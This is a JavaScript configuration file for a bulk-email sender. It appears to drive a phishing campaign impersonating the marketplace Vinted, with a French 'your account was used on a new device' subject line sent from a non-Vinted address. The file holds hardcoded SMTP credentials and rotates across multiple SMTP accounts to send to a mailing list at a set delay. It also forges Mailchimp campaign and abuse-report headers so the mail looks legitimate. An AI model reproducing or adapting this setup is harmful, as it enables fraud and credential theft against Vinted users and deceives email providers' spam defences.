
exports.send = {

	host: "smtp.centrum.cz",
	port: 587,

	// 🔥 SMTP DEFAULT (utilisé si enableConcurrency = false)
	smtpUser: "assistancevinted@centrum.cz",
	smtpPass: "Soleil94",

	// ⚡ ENABLE CONCURRENCY (multi-SMTP rotation depuis smtp.txt)
	enableConcurrency: true,

	letter: "letter.HTML",
	alt: "",
	list: "ml.txt",
	failedList: "failed.txt",

	delay: 8500,
	link: "",
	htmlEncoding: "utf-8",
	textEncoding: "quoted-printable",
	priority: "normal",

	returnPath: "",
	messageId: "",
	useHeader: true,

	fromName: "Vinted",
	fromMail: "assistancevinted@centrum.cz",
	subject: "Votre compte vient d'être utilisé sur un nouvel appareil",
	refPrefix: "VNTD",
	replyTo: "",

	emailTest: "",
	testAfter: 1000,


		header: {
		"X-Mailer": "Mailchimp Mailer - **SNX9a72f4d751b562c**",
		"X-Campaign": "mailchimpd3c49e7a5f624fba9a2d51e6c4f8b713.c918245f",
		"X-campaignid": "mailchimpd3c49e7a5fe24fba9a2d51e6c4f8b713.f4719b28ad",
		"X-Report-Abuse": "Please report abuse for this campaign here: https://mailchimp.com/contact/abuse/",
		"X-MC-User": "aa83f5c29a2d51e6c4f8b713",
		"X-Feedback-ID": "384920175:694830217.b58201d9ac:us12:mc"
	}
};